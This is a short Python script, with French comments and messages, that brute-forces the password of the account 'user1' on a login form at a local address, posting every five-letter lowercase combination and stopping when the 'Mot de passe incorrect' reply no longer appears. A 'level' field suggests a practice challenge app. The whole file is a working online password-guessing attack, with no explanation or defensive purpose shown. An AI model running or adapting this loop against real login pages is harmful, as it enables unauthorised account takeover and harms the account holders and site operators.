import itertools
import string

import requests


def bruteforce_user1() -> str | None:
    """Brute-force pour trouver le mot de passe de user1."""
    url = "http://127.0.0.1:5000/login"
    alphabet = string.ascii_lowercase

    for combination in itertools.product(alphabet, repeat=5):
        password_attempt = "".join(combination)

        payload = {"username": "user1", "password": password_attempt, "level": "1"}

        try:
            response = requests.post(url, data=payload, timeout=2)

            if "Mot de passe incorrect" not in response.text:
                print(f"Succès : {password_attempt}")
                return password_attempt

        except requests.exceptions.RequestException:
            continue

    return None


if __name__ == "__main__":
    bruteforce_user1()
